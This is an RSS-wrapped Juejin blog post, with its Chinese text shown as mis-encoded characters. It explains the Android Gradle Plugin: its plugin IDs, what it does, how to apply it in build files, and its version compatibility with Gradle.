<description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588570963294896171" data-draft-id="7588827110505283627" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android æ’ä»¶ ç¬”è®°"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T06:14:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒæºxinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android æ’ä»¶ ç¬”è®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒæºxinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:14:21.000Z" title="Mon Dec 29 2025 06:14:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Android å¼€å‘ä¸­ï¼Œ <strong>â€œAndroid æ’ä»¶â€</strong> ï¼ˆé€šå¸¸æŒ‡ <strong>Android Gradle Pluginï¼Œç®€ç§° AGP</strong>ï¼‰æ˜¯ Google å®˜æ–¹æä¾›çš„ä¸€ä¸ª <strong>Gradle æ’ä»¶</strong>ï¼Œç”¨äº<strong>æ„å»ºã€æ‰“åŒ…å’Œç®¡ç† Android åº”ç”¨é¡¹ç›®</strong>ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯è®© Gradle èƒ½å¤Ÿç†è§£å¹¶å¤„ç† Android é¡¹ç›®çš„ç‰¹æ®Šç»“æ„å’Œéœ€æ±‚ã€‚</p>
<hr/>
<h2 data-id="heading-0">ğŸ“Œ ä¸€ã€Android æ’ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<ul>
<li>
<p><strong>æ­£å¼åç§°</strong>ï¼šAndroid Gradle Pluginï¼ˆAGPï¼‰</p>
</li>
<li>
<p><strong>æ’ä»¶ ID</strong>ï¼š</p>
<ul>
<li><code>com.android.application</code> â†’ ç”¨äºæ„å»º <strong>App æ¨¡å—ï¼ˆAPK/AABï¼‰</strong></li>
<li><code>com.android.library</code> â†’ ç”¨äºæ„å»º <strong>Android åº“æ¨¡å—ï¼ˆAARï¼‰</strong></li>
</ul>
</li>
<li>
<p><strong>æœ¬è´¨</strong>ï¼šä¸€ä¸ªæ‰©å±•äº† Gradle æ„å»ºç³»ç»Ÿèƒ½åŠ›çš„æ’ä»¶ï¼Œç”± Google ç»´æŠ¤ã€‚</p>
</li>
<li>
<p><strong>ä¾èµ–å…³ç³»</strong>ï¼šAGP æœ¬èº«ä¾èµ–äºç‰¹å®šç‰ˆæœ¬çš„ <strong>Gradle</strong> å’Œ <strong>JDK</strong>ã€‚</p>
</li>
</ul>
<blockquote>
<p>âœ… ç®€å•è¯´ï¼šæ²¡æœ‰ Android æ’ä»¶ï¼ŒGradle å°±ä¸çŸ¥é“æ€ä¹ˆç¼–è¯‘ <code>.java</code>/<code>.kt</code> æ–‡ä»¶æˆ APKï¼Œæ€ä¹ˆå¤„ç† <code>AndroidManifest.xml</code>ã€èµ„æºæ–‡ä»¶ï¼ˆresï¼‰ã€ProGuardã€ç­¾åç­‰ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">ğŸ”§ äºŒã€Android æ’ä»¶çš„æ ¸å¿ƒä½œç”¨</h2>













































<table><thead><tr><th>åŠŸèƒ½</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç¼–è¯‘æºä»£ç </strong></td><td>å°† Java/Kotlin ä»£ç ç¼–è¯‘ä¸º DEX å­—èŠ‚ç ï¼ˆAndroid å¯æ‰§è¡Œæ ¼å¼ï¼‰</td></tr><tr><td><strong>å¤„ç†èµ„æºæ–‡ä»¶</strong></td><td>åˆå¹¶ <code>res/</code> ç›®å½•ä¸­çš„å¸ƒå±€ã€å›¾ç‰‡ã€å­—ç¬¦ä¸²ç­‰ï¼Œç”Ÿæˆ <code>R.java</code></td></tr><tr><td><strong>æ‰“åŒ… APK/AAB</strong></td><td>å°†ä»£ç ã€èµ„æºã€Manifest ç­‰æ‰“åŒ…æˆå¯å®‰è£…çš„ APK æˆ–å‘å¸ƒç”¨çš„ AAB</td></tr><tr><td><strong>ä¾èµ–ç®¡ç†</strong></td><td>æ”¯æŒ <code>implementation</code>ã€<code>api</code> ç­‰é…ç½®ï¼Œè§£æè¿œç¨‹/æœ¬åœ°ä¾èµ–</td></tr><tr><td><strong>æ„å»ºå˜ä½“ï¼ˆBuild Variantsï¼‰</strong></td><td>æ”¯æŒ <code>debug</code>/<code>release</code>ã€å¤šæ¸ é“ï¼ˆflavorsï¼‰ã€å¤šç»´åº¦æ„å»º</td></tr><tr><td><strong>ä»£ç æ··æ·† &amp; ä¼˜åŒ–</strong></td><td>é›†æˆ R8/ProGuardï¼Œè¿›è¡Œä»£ç å‹ç¼©ã€æ··æ·†ã€ä¼˜åŒ–</td></tr><tr><td><strong>ç­¾åç®¡ç†</strong></td><td>è‡ªåŠ¨ä¸º release åŒ…ç­¾åï¼ˆé€šè¿‡ keystore é…ç½®ï¼‰</td></tr><tr><td><strong>å•å…ƒæµ‹è¯• &amp; ä»ªå™¨æµ‹è¯•æ”¯æŒ</strong></td><td>æä¾› <code>test</code> å’Œ <code>androidTest</code> ä»»åŠ¡</td></tr><tr><td><strong>ä¸ Android SDK é›†æˆ</strong></td><td>è°ƒç”¨ aapt2ã€dx/d8ã€zipalign ç­‰ SDK å·¥å…·</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">ğŸ“ ä¸‰ã€å¦‚ä½•åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ï¼Ÿ</h2>
<h3 data-id="heading-3">1. åœ¨æ¨¡å—çš„ <code>build.gradle</code> ä¸­åº”ç”¨æ’ä»¶ï¼š</h3>
<h4 data-id="heading-4">Kotlin DSLï¼ˆ<code>build.gradle.kts</code>ï¼‰ï¼š</h4>
<pre><code class="hljs language-bash" lang="bash">plugins {
    <span class="hljs-built_in">id</span>(<span class="hljs-string">"com.android.application"</span>)   // App æ¨¡å—
    // æˆ– <span class="hljs-built_in">id</span>(<span class="hljs-string">"com.android.library"</span>) // åº“æ¨¡å—
}
</code></pre>
<h4 data-id="heading-5">Groovy DSLï¼ˆ<code>build.gradle</code>ï¼‰ï¼š</h4>
<pre><code class="hljs language-bash" lang="bash">plugins {
    <span class="hljs-built_in">id</span> <span class="hljs-string">'com.android.application'</span>
}
</code></pre>
<h3 data-id="heading-6">2. åœ¨ <code>buildscript</code> ä¸­å£°æ˜ AGP ç‰ˆæœ¬ï¼ˆæ—§æ–¹å¼ï¼Œå·²ä¸æ¨èï¼‰ï¼š</h3>
<pre><code class="hljs language-arduino" lang="arduino">buildscript {
    dependencies {
        classpath <span class="hljs-string">'com.android.tools.build:gradle:8.5.0'</span>
    }
}
</code></pre>
<blockquote>
<p>âœ… <strong>ç°ä»£æ¨èæ–¹å¼</strong>ï¼šä½¿ç”¨ <strong>Version Catalogï¼ˆ<code>libs.versions.toml</code>ï¼‰</strong> æˆ– <strong>Plugin DSL + version catalog</strong> æ¥ç®¡ç†ç‰ˆæœ¬ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">ğŸ”„ å››ã€AGP ä¸ Gradle çš„å…³ç³»</h2>




















<table><thead><tr><th>ç»„ä»¶</th><th>ä½œç”¨</th><th>ç”±è°ç»´æŠ¤</th></tr></thead><tbody><tr><td><strong>Gradle</strong></td><td>é€šç”¨æ„å»ºå·¥å…·ï¼ˆè´Ÿè´£ä»»åŠ¡è°ƒåº¦ã€ä¾èµ–è§£æç­‰ï¼‰</td><td>Gradle Inc.</td></tr><tr><td><strong>Android Gradle Plugin (AGP)</strong></td><td>æ‰©å±• Gradleï¼Œä½¿å…¶æ”¯æŒ Android é¡¹ç›®</td><td>Google</td></tr></tbody></table>
<blockquote>
<p>âš ï¸ <strong>é‡è¦</strong>ï¼šAGP å’Œ Gradle ç‰ˆæœ¬å¿…é¡»å…¼å®¹ï¼<br/>
ä¾‹å¦‚ï¼šAGP 8.5.0 è¦æ±‚ Gradle 8.6+ï¼ŒJDK 17ã€‚</p>
</blockquote>
<p>å®˜æ–¹å…¼å®¹æ€§è¡¨æ ¼ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fbuild%2Freleases%2Fgradle-plugin%23compatibility" target="_blank" title="https://developer.android.com/build/releases/gradle-plugin#compatibility" ref="nofollow noopener noreferrer">developer.android.com/build/releaâ€¦</a></p>
<hr/>
<h2 data-id="heading-8">ğŸ§© äº”ã€å¸¸è§ Android æ’ä»¶ç±»å‹</h2>

























<table><thead><tr><th>æ’ä»¶ ID</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td><code>com.android.application</code></td><td>æ„å»ºå¯è¿è¡Œçš„ Android Appï¼ˆè¾“å‡º APK/AABï¼‰</td></tr><tr><td><code>com.android.library</code></td><td>æ„å»º Android åº“ï¼ˆè¾“å‡º AARï¼Œä¾›å…¶ä»–æ¨¡å—ä¾èµ–ï¼‰</td></tr><tr><td><code>com.android.test</code></td><td>æ„å»ºæµ‹è¯• APKï¼ˆè¾ƒå°‘ç›´æ¥ä½¿ç”¨ï¼‰</td></tr><tr><td><code>com.android.dynamic-feature</code></td><td>æ„å»ºåŠ¨æ€åŠŸèƒ½æ¨¡å—ï¼ˆæŒ‰éœ€ä¸‹è½½ï¼‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">ğŸ’¡ å…­ã€ä¸ºä»€ä¹ˆéœ€è¦å…³æ³¨ Android æ’ä»¶ï¼Ÿ</h2>
<ol>
<li><strong>æ–°ç‰¹æ€§æ”¯æŒ</strong>ï¼šæ–°ç‰ˆ AGP æ”¯æŒ Composeã€Baseline Profilesã€R8 å…¨æ¨¡å¼ä¼˜åŒ–ç­‰ã€‚</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šæ–°ç‰ˆæ„å»ºæ›´å¿«ï¼ˆå¦‚å¢é‡ç¼–è¯‘ã€ç¼“å­˜ä¼˜åŒ–ï¼‰ã€‚</li>
<li><strong>å®‰å…¨åˆè§„</strong>ï¼šæ—§ç‰ˆå¯èƒ½æ— æ³•ä¸Šä¼ åˆ° Google Playï¼ˆè¦æ±‚ targetSdkVersion å’Œæ„å»ºå·¥å…·æ›´æ–°ï¼‰ã€‚</li>
<li><strong>é¿å…æ„å»ºå¤±è´¥</strong>ï¼šç‰ˆæœ¬ä¸åŒ¹é…ä¼šå¯¼è‡´ <code>Could not find method android()</code> ç­‰é”™è¯¯ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-10">âœ… æ€»ç»“</h2>
<blockquote>
<p><strong>Android æ’ä»¶ï¼ˆAGPï¼‰ = è®© Gradle èƒ½â€œè¯»æ‡‚â€å¹¶â€œæ„å»ºâ€ Android é¡¹ç›®çš„æ¡¥æ¢ã€‚</strong></p>
</blockquote>
<p>æ²¡æœ‰å®ƒï¼Œä½ çš„ Android é¡¹ç›®å°±åªæ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶å¤¹ï¼›æœ‰äº†å®ƒï¼Œæ‰èƒ½å˜æˆå¯å®‰è£…ã€å¯å‘å¸ƒçš„ Appã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>